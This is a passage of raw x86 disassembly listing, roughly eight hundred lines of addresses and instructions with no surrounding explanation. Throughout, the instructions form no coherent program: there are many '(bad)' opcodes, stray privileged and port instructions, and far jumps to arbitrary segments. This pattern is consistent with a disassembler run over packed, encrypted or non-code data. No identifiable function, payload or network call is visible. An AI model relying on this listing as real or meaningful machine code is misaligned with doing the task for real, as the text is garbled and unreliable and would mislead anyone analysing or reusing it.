  4161cb:	cmp    esp,DWORD PTR [edx+ebx*8+0x50a8c161]
  4161d2:	mov    ah,0xc4
  4161d4:	xchg   ecx,eax
  4161d5:	and    eax,0x4cda528
  4161da:	xchg   edi,eax
  4161db:	ss mov ah,0x9
  4161de:	loope  0x41623d
  4161e0:	push   esp
  4161e1:	jae    0x416188
  4161e3:	xchg   DWORD PTR [esi],eax
  4161e5:	push   esp
  4161e6:	lods   al,BYTE PTR ds:[esi]
  4161e7:	retf   
  4161e8:	jno    0x416197
  4161ea:	aaa    
  4161eb:	lahf   
  4161ec:	(bad)
  4161ef:	sub    bl,cl
  4161f1:	test   al,0x42
  4161f3:	push   edx
  4161f4:	adc    edi,DWORD PTR [edx-0x155417e8]
  4161fa:	adc    cl,0x6c
  4161fd:	pop    edi
  4161fe:	cmc    
  4161ff:	push   ebx
  416200:	pop    esp
  416201:	or     ecx,0xccb5ef20
  416207:	icebp  
  416208:	sar    DWORD PTR [esi+eiz*8+0x28],1
  41620c:	call   0xc8fe0574
  416211:	add    DWORD PTR [edi+0x60],ecx
  416214:	inc    edx
  416215:	clc    
  416216:	fs add al,0x4b
  416219:	mov    ebx,0xd27a6ece
  41621e:	xchg   ebp,eax
  41621f:	xchg   esi,eax
  416220:	mov    edx,0x67e3ba0c
  416225:	mov    ebp,0x8ddff3e3
  41622a:	mov    esp,0x495a410e
  41622f:	inc    edx
  416230:	push   ebp
  416231:	or     BYTE PTR [eax],0xc7
  416234:	mov    ebx,0xe9eae5af
  416239:	cmp    ch,BYTE PTR [eax]
  41623b:	enter  0x8bb6,0x80
  41623f:	(bad)  
  416240:	loop   0x41629b
  416242:	xchg   DWORD PTR [ecx+0x2b76d0],eax
  416248:	leave  
  416249:	inc    ecx
  41624a:	(bad)  
  41624b:	(bad)  
  41624c:	dec    ebx
  41624d:	stos   BYTE PTR es:[edi],al
  41624e:	add    BYTE PTR ds:0xc12b62b7,0xd0
  416255:	push   0x50c10304
  41625a:	sbb    BYTE PTR [eax+0x409c158],bl
  416260:	jecxz  0x4162c5
  416262:	idiv   BYTE PTR [edi+ebp*8]
  416265:	jl     0x4162b4
  416267:	jno    0x41626d
  416269:	pushf  
  41626a:	cmp    DWORD PTR [ebp-0x6],esi
  41626d:	sub    DWORD PTR [ebx-0x7a81a493],esi
  416273:	ss xor edx,eax
  416276:	xor    al,0x8c
  416278:	jmp    0x139f:0x3ac7f7c9
  41627f:	imul   ebp,DWORD PTR [edi],0x9eca1c7
  416285:	lods   eax,DWORD PTR ds:[esi]
  416286:	mov    dl,0x8a
  416288:	mov    ecx,0x7d6a4072
  41628d:	xchg   ebx,eax
  41628e:	(bad)  
  41628f:	sub    edi,ebp
  416291:	dec    esp
  416292:	aam    0xe4
  416294:	and    BYTE PTR [edx+0x77],al
  416297:	inc    ebp
  416298:	mov    dh,0xd
  41629a:	jnp    0x416293
  41629c:	jge    0x4162a8
  41629e:	lods   eax,DWORD PTR ds:[esi]
  41629f:	call   0x558e:0x3cfad607
  4162a6:	ror    DWORD PTR [edx+0x61],1
  4162a9:	mov    al,ds:0x87b807d7
  4162ae:	mov    eax,ds:0x5ebac66b
  4162b3:	sub    al,0xfd
  4162b5:	pmaxsw mm7,QWORD PTR [edx+0x9]
  4162b9:	rcl    DWORD PTR [ebx+0x25],cl
  4162bc:	(bad)  
  4162bd:	and    eax,DWORD PTR ds:0xd9c9cd6f
  4162c3:	adc    al,0x4a
  4162c5:	dec    ebp
  4162c6:	mov    ds:0x1785b7d7,eax
  4162cb:	loope  0x416329
  4162cd:	cli    
  4162ce:	push   esp
  4162cf:	or     BYTE PTR [edx],ch
  4162d1:	xor    eax,0xcefc0030
  4162d6:	in     al,dx
  4162d7:	in     al,dx
  4162d8:	push   edx
  4162d9:	inc    edx
  4162da:	or     bh,BYTE PTR [edx-0x1a]
  4162dd:	inc    ebx
  4162de:	mov    cl,0x29
  4162e0:	xchg   ebx,eax
  4162e1:	add    edi,ebx
  4162e3:	icebp  
  4162e4:	ss xchg ebp,eax
  4162e6:	lahf   
  4162e7:	test   BYTE PTR [ebp-0xb424da4],dl
  4162ed:	lock sub ebp,ebx
  4162f0:	adc    ch,cl
  4162f2:	int3   
  4162f3:	jb     0x4162bb
  4162f5:	xchg   BYTE PTR [ebx],bh
  4162f7:	inc    eax
  4162f8:	adc    edi,edi
  4162fa:	push   es
  4162fb:	outs   dx,DWORD PTR ds:[esi]
  4162fc:	dec    esi
  4162fd:	test   DWORD PTR [esi],ebx
  4162ff:	imul   ecx,DWORD PTR [esi-0x29985c39],0x4
  416306:	sub    eax,DWORD PTR [edx]
  416308:	sbb    al,0xf9
  41630a:	cmp    cl,BYTE PTR [edx+ebx*1+0x55]
  41630e:	mov    ebp,0x8c3dd753
  416313:	leave  
  416314:	sub    DWORD PTR [esi],0xb0e64c25
  41631a:	cs push edx
  41631c:	iret   
  41631d:	call   0x536cdbd4
  416322:	mov    ebp,0x93b543f7
  416327:	nop
  416328:	pop    ecx
  416329:	les    ebx,FWORD PTR [ebx]
  41632b:	ja     0x4162bf
  41632d:	cmp    eax,0x5e38c9a4
  416332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416333:	sub    al,0xb
  416335:	idiv   BYTE PTR [eax]
  416337:	xor    bh,BYTE PTR [esi+0x412af861]
  41633d:	xor    BYTE PTR [ebx],ch
  41633f:	scas   eax,DWORD PTR es:[edi]
  416340:	lahf   
  416341:	push   es
  416342:	cmp    BYTE PTR [edx-0x6825e39e],ch
  416348:	adc    DWORD PTR [ebx+eiz*4-0x21],esi
  41634c:	mov    DWORD PTR [edi-0x45338411],esi
  416352:	js     0x416329
  416354:	(bad)  
  416355:	mov    al,ds:0x1e019ba7
  41635a:	mov    BYTE PTR [ebx],ch
  41635c:	mov    edi,DWORD PTR [esi]
  41635e:	lds    ebx,FWORD PTR [ebp+0x2359fec7]
  416364:	aad    0x34
  416366:	jne    0x416362
  416368:	daa    
  416369:	mov    WORD PTR [edx-0x3d8147a4],fs
  41636f:	adc    esi,DWORD PTR [ebp-0x127fe4ae]
  416375:	cmp    al,0x4e
  416377:	and    eax,0x38369cca
  41637c:	ss lock mov ch,0x1e
  416380:	cmp    al,0x5c
  416382:	cmp    al,0x4e
  416384:	iret   
  416385:	fs jns 0x416317
  416388:	fcom   st(1)
  41638a:	repz jo 0x41630f
  41638d:	daa    
  41638e:	rol    bh,cl
  416390:	push   0x74
  416392:	fptan  
  416394:	retf   0xaa89
  416397:	cmp    eax,0x94c7ce58
  41639c:	rcr    DWORD PTR [esi-0x11],1
  41639f:	jb     0x4163d0
  4163a1:	sub    cl,BYTE PTR [ecx+0x12]
  4163a4:	(bad)  
  4163a5:	cmc    
  4163a6:	mov    dh,0x86
  4163a8:	cdq    
  4163a9:	test   eax,0xa2673e3c
  4163ae:	lods   eax,DWORD PTR ds:[esi]
  4163af:	sbb    ch,BYTE PTR [ebx+0x5cf6a8cd]
  4163b5:	push   edi
  4163b6:	cmp    BYTE PTR ds:0x9cc0633f,al
  4163bc:	mov    DWORD PTR [edi],ebp
  4163be:	test   BYTE PTR [ecx+0x52],al
  4163c1:	loopne 0x41636a
  4163c3:	jo     0x416431
  4163c5:	mov    bh,0x3d
  4163c7:	lock shl DWORD PTR [ebp-0x33],cl
  4163cb:	jl     0xc3cada04
  4163d1:	mov    dh,0xfa
  4163d3:	dec    ebx
  4163d4:	or     BYTE PTR [ebp-0x9],bl
  4163d7:	popa   
  4163d8:	cwd    
  4163da:	lods   eax,DWORD PTR ds:[esi]
  4163db:	sbb    bl,bl
  4163dd:	ins    BYTE PTR es:[edi],dx
  4163de:	xor    al,0x31
  4163e0:	mov    ecx,0x67fcc451
  4163e5:	int3   
  4163e6:	sub    BYTE PTR [eax],ah
  4163e8:	sub    DWORD PTR [edx+edi*1+0x4e416f41],0xbac70ef2
  4163f3:	shl    DWORD PTR [ecx],1
  4163f5:	and    al,0xdd
  4163f7:	pop    esi
  4163f8:	rol    esp,cl
  4163fa:	stos   DWORD PTR es:[edi],eax
  4163fb:	sub    al,0x2b
  4163fd:	cwde   
  4163fe:	es jno 0x41646f
  416401:	pop    ss
  416402:	pushf  
  416403:	or     edi,ebp
  416405:	js     0x416432
  416407:	xor    DWORD PTR [edi-0x59],esp
  41640a:	sub    eax,0x2975ce23
  41640f:	pop    edi
  416410:	retf   
  416411:	mov    ebp,0x39381b6b
  416416:	xchg   BYTE PTR [ecx],bh
  416418:	shr    DWORD PTR [ecx+0x75],0x2d
  41641c:	sbb    BYTE PTR [edi-0x6a730b00],cl
  416422:	test   al,0x25
  416424:	fcmovbe st,st(6)
  416426:	or     eax,0x3cf602cb
  41642b:	sbb    BYTE PTR [esi],bl
  41642d:	shl    BYTE PTR ds:0x60965a6d,0x13
  416434:	js     0x416448
  416436:	lods   eax,DWORD PTR ds:[esi]
  416437:	or     eax,0x8f894fe5
  41643c:	shr    BYTE PTR [ebx-0x10654f86],0xd6
  416443:	xor    edi,ecx
  416445:	add    dl,BYTE PTR [eax-0x567d7c40]
  41644b:	sbb    ebx,DWORD PTR [eax-0x70]
  41644e:	and    eax,0xa2a8258b
  416453:	ds popf 
  416455:	out    0xb5,eax
  416457:	ret    0x9413
  41645a:	loop   0x4163fb
  41645c:	rcl    edx,0xdc
  41645f:	(bad)  
  416460:	test   BYTE PTR [ebx],bl
  416462:	add    al,0xe3
  416464:	mov    ch,BYTE PTR [edi-0x199b23b6]
  41646a:	push   0xfcd6bc66
  41646f:	lods   eax,DWORD PTR ds:[esi]
  416470:	xchg   edi,eax
  416471:	ret    0x985a
  416474:	xchg   ebx,ebx
  416476:	ja     0x416407
  416478:	inc    esi
  416479:	repz pop edi
  41647b:	fldenv [edx-0x3b]
  41647e:	jbe    0x416486
  416480:	xor    DWORD PTR [edi],0xb0d008a6
  416486:	or     eax,0x1062c961
  41648b:	stos   DWORD PTR es:[edi],eax
  41648c:	jle    0x4164ce
  41648e:	sub    DWORD PTR [eax],edi
  416490:	jmp    0xb1e0:0xfedf303d
  416497:	mov    ah,BYTE PTR [eax]
  416499:	dec    edi
  41649a:	fmul   st,st(5)
  41649c:	dec    ebx
  41649d:	sbb    ecx,edx
  41649f:	jp     0x4164d3
  4164a1:	sbb    edi,edi
  4164a3:	out    dx,eax
  4164a4:	sbb    eax,0xbd99b39
  4164a9:	imul   BYTE PTR [esi-0x55c3375c]
  4164af:	mul    BYTE PTR [edx]
  4164b1:	mov    dh,0x6b
  4164b3:	mov    edx,0xa36de746
  4164b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b9:	fist   DWORD PTR [edi]
  4164bb:	pop    ebp
  4164bc:	out    0x7d,eax
  4164be:	inc    ebp
  4164bf:	sub    BYTE PTR [edx-0x38878b21],dh
  4164c5:	daa    
  4164c6:	leave  
  4164c7:	repz aam 0x38
  4164ca:	jae    0x4164a3
  4164cc:	jno    0x4164ae
  4164ce:	cwde   
  4164cf:	inc    edi
  4164d0:	jmp    DWORD PTR [edx+0x2aa3fe98]
  4164d6:	xor    cl,dh
  4164d8:	pavgw  mm3,QWORD PTR [ebx]
  4164db:	mov    ?,WORD PTR [edi+0x69]
  4164de:	xlat   BYTE PTR ds:[ebx]
  4164df:	dec    ebx
  4164e0:	idiv   DWORD PTR [edi-0x3c493f19]
  4164e6:	dec    esp
  4164e7:	ins    DWORD PTR es:[edi],dx
  4164e8:	mov    esi,esi
  4164ea:	lods   eax,DWORD PTR ds:[esi]
  4164eb:	add    dl,0xa7
  4164ee:	mov    ecx,0x7d658772
  4164f3:	rcl    DWORD PTR [eax+0x5],cl
  4164f6:	pop    ebx
  4164f7:	out    0x41,eax
  4164f9:	add    DWORD PTR [edi+0x10b479d7],ebp
  4164ff:	jno    0x4164cc
  416501:	into   
  416502:	push   ds
  416503:	fwait
  416504:	sbb    ebp,DWORD PTR [ebx+0x367c547d]
  41650a:	and    dl,BYTE PTR [esi+0x14dad943]
  416510:	scas   eax,DWORD PTR es:[edi]
  416511:	neg    BYTE PTR [esi]
  416513:	and    BYTE PTR [ebp-0x7bb39fec],bl
  416519:	daa    
  41651a:	ja     0x416554
  41651c:	xchg   edx,eax
  41651d:	ss adc eax,0x25359083
  416523:	lods   al,BYTE PTR ds:[esi]
  416524:	dec    BYTE PTR [eax+0x36c40bd9]
  41652a:	stc    
  41652b:	push   es
  41652c:	out    0xb9,al
  41652e:	mov    bh,0xdb
  416530:	out    0x76,al
  416532:	xchg   ebx,eax
  416533:	mov    dh,0x5b
  416535:	leave  
  416536:	dec    ebx
  416537:	js     0x416543
  416539:	pop    esp
  41653a:	rcr    DWORD PTR [eax+0x3aad7854],cl
  416540:	leave  
  416541:	aaa    
  416542:	jmp    0x416503
  416544:	cli    
  416545:	dec    edi
  416546:	mov    edi,0x48e144de
  41654b:	mov    dh,0x75
  41654d:	dec    ebx
  41654e:	xchg   BYTE PTR [ebx],al
  416550:	push   0x22
  416552:	adc    eax,0x7042ae40
  416557:	and    cl,BYTE PTR [edx-0x56]
  41655a:	(bad)  
  41655b:	or     esp,DWORD PTR [edi]
  41655d:	push   ebp
  41655e:	outs   dx,DWORD PTR ds:[esi]
  41655f:	in     eax,0x47
  416561:	pop    eax
  416562:	mov    edi,0xf9c37ac0
  416567:	mov    ebx,DWORD PTR [edi]
  416569:	rcr    BYTE PTR [edx+eax*8],1
  41656c:	sub    eax,0x7617da7c
  416571:	sub    eax,0xee7c51c6
  416576:	pop    edx
  416577:	sbb    BYTE PTR [esi+0x7d],ah
  41657a:	stc    
  41657b:	cwde   
  41657c:	add    ecx,DWORD PTR [edi]
  41657e:	stos   BYTE PTR es:[edi],al
  41657f:	ja     0x4165f2
  416581:	popf   
  416582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416583:	pop    ebp
  416584:	xor    ah,bl
  416586:	and    eax,0x94e178df
  41658b:	sbb    esp,edx
  41658d:	push   edi
  41658e:	and    eax,0xeef6a662
  416593:	inc    eax
  416594:	mov    ebp,0xa1ea8d8a
  416599:	pop    ds
  41659a:	pop    esi
  41659b:	pop    esi
  41659c:	loope  0x416584
  41659e:	js     0x416619
  4165a0:	cmp    bl,BYTE PTR [eax]
  4165a2:	and    edx,DWORD PTR [esi+0x4dc366be]
  4165a8:	loopne 0x4165ee
  4165aa:	repz push eax
  4165ac:	jmp    0xf2c013ff
  4165b1:	jl     0x4165a1
  4165b3:	cmp    DWORD PTR [ecx],eax
  4165b5:	push   ecx
  4165b6:	pop    ecx
  4165b7:	sbb    al,0x86
  4165b9:	mov    ebp,0x461f3e1
  4165be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165bf:	in     al,dx
  4165c0:	jecxz  0x416611
  4165c2:	xor    ch,ch
  4165c4:	inc    eax
  4165c5:	ds das 
  4165c7:	fild   DWORD PTR ds:0xf79a696e
  4165cd:	mov    BYTE PTR [ebx-0x1e],ch
  4165d0:	xor    BYTE PTR [ecx+0x30e2036a],0x38
  4165d7:	inc    edx
  4165d8:	push   edi
  4165d9:	xchg   edi,eax
  4165da:	pop    edi
  4165db:	aaa    
  4165dc:	lock or bl,BYTE PTR [ebp+0xe]
  4165e0:	dec    edi
  4165e1:	imul   esp,DWORD PTR [edx],0xe2bb8055
  4165e7:	adc    DWORD PTR [edx-0x612d82ba],esi
  4165ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ee:	cs aaa 
  4165f0:	pop    ecx
  4165f1:	leave  
  4165f2:	fwait
  4165f3:	push   ebp
  4165f4:	push   0xabdfd3ad
  4165f9:	jno    0x4165f2
  4165fb:	imul   DWORD PTR [eax]
  4165fd:	mov    bh,0x6e
  4165ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416600:	mov    ds:0xe6d091bb,al
  416605:	and    ebp,DWORD PTR [esi]
  416607:	add    eax,esi
  416609:	mov    BYTE PTR [edi+0x64],ch
  41660c:	popf   
  41660d:	jmp    0xfd8:0xa87bc558
  416614:	cs aad 0x98
  416617:	out    dx,eax
  416618:	add    BYTE PTR [ebx+0x30],ch
  41661b:	icebp  
  41661c:	push   edi
  41661d:	xchg   esi,eax
  41661e:	pop    esi
  41661f:	jecxz  0x416622
  416621:	(bad)  
  416624:	mov    ds:0x9ccb8937,eax
  416629:	call   0xb0ad88bc
  41662e:	dec    esi
  41662f:	test   ch,ah
  416631:	sub    cl,BYTE PTR [edi-0x70]
  416634:	cmp    DWORD PTR [esi+0x49],ebx
  416637:	cmp    eax,esi
  416639:	shr    dl,cl
  41663b:	retf   
  41663c:	addr16 jg 0x41668b
  41663f:	xlat   BYTE PTR ds:[ebx]
  416640:	xchg   ebx,eax
  416641:	repnz mov al,0xbb
  416644:	rcr    esi,0xd4
  416647:	in     al,dx
  416648:	js     0x416659
  41664a:	fsubr  st(1),st
  41664c:	xchg   edx,eax
  41664d:	and    dh,BYTE PTR [esi+0xfdbad1c]
  416653:	add    BYTE PTR [eax-0x75],bh
  416656:	push   ecx
  416657:	ficomp WORD PTR [edi-0xf77fc5]
  41665d:	mov    cl,0x9f
  41665f:	aam    0x32
  416661:	xchg   edi,eax
  416662:	dec    ebp
  416663:	aad    0xce
  416665:	xchg   edx,eax
  416666:	and    eax,0x2e8254cb
  41666b:	sbb    eax,0xb52ccb48
  416670:	std    
  416671:	xrelease mov BYTE PTR [edi+ebx*1],ah
  416675:	fmul   QWORD PTR [esi-0x2c219878]
  41667b:	jns    0x4166e7
  41667d:	or     ebx,ebp
  41667f:	pop    ss
  416680:	leave  
  416681:	or     al,0x75
  416683:	pop    esp
  416684:	xchg   esi,eax
  416685:	mov    DWORD PTR [esi-0x63123ada],esp
  41668b:	jnp    0x416639
  41668d:	dec    edx
  41668e:	dec    edi
  41668f:	cwde   
  416690:	fbld   TBYTE PTR [ebx+0xaadac96]
  416696:	stos   DWORD PTR es:[edi],eax
  416697:	xor    al,0x24
  416699:	in     al,dx
  41669a:	out    dx,al
  41669b:	out    0xfd,eax
  41669d:	push   esi
  41669e:	adc    eax,0x80444692
  4166a3:	out    0xd6,eax
  4166a5:	jmp    0x99b2928b
  4166aa:	into   
  4166ab:	dec    ebx
  4166ac:	xchg   esi,eax
  4166ad:	xor    BYTE PTR [esi+0x5],ch
  4166b0:	sub    al,0xd3
  4166b2:	ret    
  4166b3:	mov    ds:0x1a54b839,eax
  4166b8:	les    edi,FWORD PTR [edx-0x3b]
  4166bb:	pop    ebp
  4166bc:	jns    0x41669a
  4166be:	push   esp
  4166bf:	lods   al,BYTE PTR ds:[esi]
  4166c0:	add    ebx,DWORD PTR [edi]
  4166c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c3:	ins    BYTE PTR es:[edi],dx
  4166c4:	fiadd  DWORD PTR [eax-0x52]
  4166c7:	or     bl,BYTE PTR [eax+esi*2+0x11]
  4166cb:	pop    edx
  4166cc:	fiadd  DWORD PTR [ecx]
  4166ce:	pop    ds
  4166cf:	jp     0x416726
  4166d1:	and    BYTE PTR [eax],bl
  4166d3:	pop    esi
  4166d4:	push   ss
  4166d5:	adc    DWORD PTR [ecx-0x71],ebp
  4166d8:	xchg   edi,eax
  4166d9:	nop
  4166da:	sub    DWORD PTR [esi-0x30109383],edx
  4166e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166e1:	stos   DWORD PTR es:[edi],eax
  4166e2:	adc    eax,0xe7dcc384
  4166e7:	cwde   
  4166e8:	cmp    BYTE PTR [ecx+0x7631e20],dh
  4166ee:	fstp   DWORD PTR [esi-0x68]
  4166f1:	jae    0x41673e
  4166f3:	jp     0x4166da
  4166f5:	outs   dx,DWORD PTR ds:[esi]
  4166f6:	in     al,dx
  4166f7:	pop    DWORD PTR [eax]
  4166f9:	loop   0x4166c5
  4166fb:	jnp    0x4166d8
  4166fd:	jnp    0x416703
  4166ff:	pop    ss
  416700:	xchg   edx,eax
  416701:	add    DWORD PTR [edx+0x6bc43faa],eax
  416707:	pop    eax
  416708:	scas   al,BYTE PTR es:[edi]
  416709:	aas    
  41670a:	iret   
  41670b:	pop    esi
  41670c:	clc    
  41670d:	mov    esi,0x84fd21e2
  416712:	lods   eax,DWORD PTR ds:[esi]
  416713:	ret    
  416714:	popf   
  416715:	dec    eax
  416716:	lods   eax,DWORD PTR ds:[esi]
  416717:	cmp    al,0x6c
  416719:	and    BYTE PTR [esi+edi*2+0x51],0x6e
  41671e:	xor    eax,0xa65435ef
  416723:	or     esi,DWORD PTR [ebp-0x2cfc4916]
  416729:	pop    ebx
  41672a:	cmp    cl,dl
  41672c:	add    ecx,DWORD PTR [ebp+eiz*1+0x52dea1cd]
  416733:	mov    WORD PTR [ecx+0x24],es
  416736:	imul   esp,DWORD PTR [ecx+0x2edc592e],0xd1b2a2bb
  416740:	cli    
  416741:	int    0xbe
  416743:	call   0xa2e69ec0
  416748:	jbe    0x41676c
  41674a:	push   0xffffff8e
  41674c:	dec    ebx
  41674d:	xor    BYTE PTR [eax+0xc],0x19
  416751:	fdiv   st,st(5)
  416753:	xchg   edi,eax
  416754:	sbb    eax,0x8bb7afcb
  416759:	xchg   esp,eax
  41675a:	xchg   DWORD PTR [ecx+0x4e],esi
  41675d:	in     eax,0x52
  41675f:	sbb    al,0x73
  416761:	mov    DWORD PTR gs:[ecx+esi*4+0x31],ecx
  416766:	fcomp  st(3)
  416768:	(bad)  
  416769:	push   ds
  41676a:	push   es
  41676b:	mov    eax,ds:0x45f84b43
  416770:	retf   0xb44f
  416773:	push   edi
  416774:	retf   
  416775:	sub    eax,0x541efd32
  41677a:	ret    0x9e14
  41677d:	shl    dh,0x5b
  416780:	xor    BYTE PTR [ebp+0x26a62b3d],ch
  416786:	inc    ecx
  416787:	sbb    BYTE PTR [eax],cl
  416789:	mov    DWORD PTR gs:[ecx+0x72c6bc84],edi
  416790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416791:	test   al,0x20
  416793:	loope  0x416769
  416795:	icebp  
  416796:	call   0xab2f:0x1710fd3
  41679d:	push   eax
  41679e:	jg     0x416743
  4167a0:	hlt    
  4167a1:	int    0xfc
  4167a3:	out    dx,eax
  4167a4:	dec    ebp
  4167a5:	add    esp,DWORD PTR [esi+0x2c924049]
  4167ab:	push   ebx
  4167ac:	into   
  4167ad:	add    al,0x88
  4167af:	mov    al,ds:0x7b832e5a
  4167b4:	(bad)  [ecx+0x2e1bc5a8]
  4167ba:	cld    
  4167bb:	cmp    DWORD PTR [edx],ecx
  4167bd:	in     eax,dx
  4167be:	pop    eax
  4167bf:	jmp    0x232f:0xf700b41a
  4167c6:	push   ebp
  4167c7:	fwait
  4167c8:	mov    ah,0x99
  4167ca:	jns    0x416771
  4167cc:	es inc edx
  4167ce:	sbb    al,0xec
  4167d0:	sbb    BYTE PTR [esi+0x10],cl
  4167d3:	pusha  
  4167d4:	pop    es
  4167d5:	jmp    0x62c7:0x1a7850e6
  4167dc:	xchg   ebp,eax
  4167dd:	aas    
  4167de:	add    dh,BYTE PTR [ebx]
  4167e0:	mov    ah,0x3a
  4167e2:	dec    ecx
  4167e3:	mov    dh,0x4a
  4167e5:	fst    DWORD PTR [ebp-0x7a39b4e9]
  4167eb:	jmp    0x416796
  4167ed:	mov    eax,ds:0x1ff3f392
  4167f2:	icebp  
  4167f3:	mov    bh,0x19
  4167f5:	retf   
  4167f6:	mov    DWORD PTR [esi-0x249bd63],edx
  4167fc:	rcl    edi,1
  4167fe:	sbb    BYTE PTR [esp+ebx*2+0xd],bh
  416802:	bound  ecx,QWORD PTR [ebx+edi*8+0x25888c54]
  416809:	push   edi
  41680a:	cmc    
  41680b:	aaa    
  41680c:	add    DWORD PTR [esi+0x3ef9e7c5],edx
  416812:	ror    ebp,1
  416814:	and    ebp,0xd
  416817:	or     BYTE PTR [ebx+0x4],0x7e
  41681b:	add    BYTE PTR [ebp-0x21],bl
  41681e:	lock ds test eax,0xe7cd1bba
  416825:	repz (bad) 
  416827:	mov    ecx,0xf5bd3cd7
  41682c:	dec    ebp
  41682d:	not    dh
  41682f:	xchg   DWORD PTR [eax+edi*4-0x61],esp
  416833:	push   ecx
  416834:	adc    BYTE PTR [ebx+0x13],al
  416837:	xor    dh,dh
  416839:	ss inc eax
  41683b:	mov    al,0x9
  41683d:	int3   
  41683e:	test   eax,0x800632c
  416843:	pop    ecx
  416844:	mov    ds:0x6c93fa0f,al
  416849:	out    dx,al
  41684a:	popa   
  41684b:	jae    0x416823
  41684d:	sti    
  41684e:	push   esi
  41684f:	cwde   
  416850:	jnp    0x41685f
  416852:	das    
  416853:	aad    0xf9
  416855:	fnsave [eax+0x69]
  416858:	cmc    
  416859:	push   edi
  41685a:	push   ecx
  41685b:	je     0x416860
  41685d:	iret   
  41685e:	lea    esp,[edi]
  416860:	xchg   ebp,eax
  416861:	dec    DWORD PTR [ebx+esi*2+0x499310d1]
  416868:	push   ebp
  416869:	jecxz  0x416828
  41686b:	imul   esi,DWORD PTR [edx+0x7bc689e2],0xffffffb3
  416872:	pop    ss
  416873:	xor    ebp,DWORD PTR ds:0xce56ca85
  416879:	es ja  0x4168dd
  41687c:	stos   DWORD PTR es:[edi],eax
  41687d:	dec    eax
  41687e:	ds push ss
  416880:	sbb    esp,esi
  416882:	adc    dl,dl
  416884:	xchg   esi,eax
  416885:	ds inc edi
  416887:	pop    esp
  416888:	jp     0x4168ed
  41688a:	jg     0x4168ce
  41688c:	shl    DWORD PTR [eax+0x487cdb47],1
  416892:	pop    ebp
  416893:	pushf  
  416894:	stc    
  416895:	mov    ebp,DWORD PTR [ebp+0x7]
  416898:	js     0x4168f8
  41689a:	pop    ebp
  41689b:	xor    al,0x58
  41689d:	jp     0x41690f
  41689f:	fwait
  4168a0:	mov    ds:0x93e3fa96,al
  4168a5:	lods   eax,DWORD PTR ds:[esi]
  4168a6:	outs   dx,DWORD PTR ss:[esi]
  4168a8:	pusha  
  4168a9:	(bad)  
  4168aa:	(bad)
  4168ad:	daa    
  4168ae:	mov    ebx,0x5660e6da
  4168b3:	inc    ebx
  4168b4:	xchg   edi,eax
  4168b5:	sub    ah,BYTE PTR [esi+ebx*8+0x3a]
  4168b9:	popa   
  4168ba:	mov    ah,0x75
  4168bc:	push   0x559c43ae
  4168c1:	adc    al,BYTE PTR [edx-0x778cea88]
  4168c7:	lahf   
  4168c8:	sbb    ah,ch
  4168ca:	mov    esi,0xa43f5ffd
  4168cf:	mov    ebp,edi
  4168d1:	ins    DWORD PTR es:[edi],dx
  4168d2:	gs mov eax,0xdf7bfb31
  4168d8:	jmp    0x416900
  4168da:	cwde   
  4168db:	wrmsr  
  4168dd:	daa    
  4168de:	leave  
  4168df:	loop   0x416954
  4168e1:	dec    ebp
  4168e2:	push   esp
  4168e3:	inc    ebp
  4168e4:	cmp    BYTE PTR fs:[edx+esi*1],dh
  4168e8:	stos   BYTE PTR es:[edi],al
  4168e9:	push   ecx
  4168ea:	test   BYTE PTR [esi+eiz*8],bl
  4168ed:	mov    dl,0x49
  4168ef:	std    
  4168f0:	gs scas eax,DWORD PTR es:[edi]
  4168f2:	push   es
  4168f3:	xchg   ecx,eax
  4168f4:	add    eax,0xfc9f2ddc
  4168f9:	xchg   ebp,eax
  4168fa:	hlt    
  4168fb:	imul   eax,DWORD PTR [ecx+eiz*2+0x750ae141],0xdaa2f0a6
  416906:	daa    
  416907:	or     DWORD PTR [ecx-0x5752c60e],ebp
  41690d:	dec    esi
  41690e:	ret    
  41690f:	cdq    
  416910:	pop    eax
  416911:	sar    DWORD PTR [esi+0x10],0x72
  416915:	ins    DWORD PTR es:[edi],dx
  416916:	sub    al,0xb2
  416918:	mov    bh,0x1e
  41691a:	inc    eax
  41691b:	pop    es
  41691c:	inc    esp
  41691d:	lods   eax,DWORD PTR ds:[esi]
  41691e:	xor    eax,0x34e628c7
  416923:	(bad)  
  416924:	mov    eax,?
  416926:	mov    ch,0xe7
  416928:	and    al,0x69
  41692a:	inc    esi
  41692b:	jle    0x416959
  41692d:	pop    ebx
  41692e:	inc    ecx
  41692f:	sub    DWORD PTR [ebx+edi*2],esi
  416932:	dec    dx
  416934:	loop   0x416954
  416936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416937:	xor    DWORD PTR [eax+0x21],esp
  41693a:	loopne 0x41696a
  41693c:	mov    dl,0x4b
  41693e:	jb     0x41696c
  416940:	ss ja  0x416925
  416943:	dec    ebx
  416944:	loopne 0x4168ce
  416946:	mov    BYTE PTR [ebp-0x2a76edef],dh
  41694c:	fstp   QWORD PTR [eax]
  41694e:	clc    
  41694f:	sbb    eax,0xe9662cb7
  416954:	jge    0x41694c
  416956:	retf   
  416957:	in     al,dx
  416958:	jmp    0x4169d4
  41695a:	out    0x47,al
  41695c:	call   0x444d:0xcb367272
  416963:	call   0xca3d1f07
  416968:	pop    edi
  416969:	jp     0x41695f
  41696b:	sbb    DWORD PTR [ecx-0x6b],esp
  41696e:	fadd   DWORD PTR [edi+0x319a409a]
  416974:	cld    
  416975:	iret   
  416976:	jle    0x4169a1
  416978:	fist   WORD PTR [esi-0x23]
  41697b:	pop    esi
  41697c:	stc    
  41697d:	mov    DWORD PTR [eax-0x7],eax
  416980:	in     eax,dx
  416981:	or     al,BYTE PTR ds:0xacf2759e
  416987:	in     al,0x71
  416989:	sbb    eax,0x77271084
  41698e:	test   DWORD PTR [ebx],esp
  416990:	fs lahf 
  416992:	cmp    eax,0x9f2600a2
  416997:	fs repz inc esi
  41699a:	push   edi
  41699b:	cdq    
  41699c:	mov    ch,0x3c
  41699e:	cs mov esi,0x9d620dba
  4169a4:	push   ebp
  4169a5:	je     0x416939
  4169a7:	cmp    al,0x1c
  4169a9:	inc    eax
  4169aa:	(bad)  
